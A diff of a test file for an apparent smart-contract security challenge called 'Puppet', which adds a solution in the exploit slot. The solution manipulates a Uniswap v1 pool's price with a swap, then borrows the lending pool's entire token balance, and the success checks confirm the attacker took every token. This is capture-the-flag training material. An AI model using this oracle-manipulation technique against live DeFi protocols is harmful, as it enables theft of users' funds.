@@ -3,7 +3,7 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 const { expect } = require('chai');
 
 // Hacky way to easily get the Uniswap v1 contracts as artifacts
-// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi 
+// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi
 contract.artifactsDir = 'build-uniswap-v1';
 const UniswapExchange = contract.fromArtifact('UniswapV1Exchange');
 const UniswapFactory = contract.fromArtifact('UniswapV1Factory');
@@ -54,7 +54,7 @@ describe('[Challenge] Puppet', function () {
             this.uniswapExchange.address,
             { from: deployer }
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -93,11 +93,24 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        // https://docs.uniswap.org/protocol/V1/guides/pool-liquidity
+
+        const { time } = require('@openzeppelin/test-helpers');
+        const deadline = (await time.latest()).add(time.duration.days(1)).toString();
+
+        await this.token.approve(this.uniswapExchange.address, ether('1'), { from: attacker });
+        await this.uniswapExchange.tokenToEthSwapInput(ether('1'), '1', deadline, { from: attacker });
+
+        const borrowAmount = await this.token.balanceOf(this.lendingPool.address, { from: attacker });
+        await this.lendingPool.borrow(borrowAmount, { from: attacker });
+
+        await this.token.approve(this.uniswapExchange.address, ether('1'), { from: attacker });
+        await this.uniswapExchange.tokenToEthSwapInput(ether('1'), '1', deadline, { from: attacker });
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
@@ -105,7 +118,7 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.bignumber.eq('0');
-        
+
         // Attacker ETH balance has not decreased
         expect(
             await balance.current(attacker)
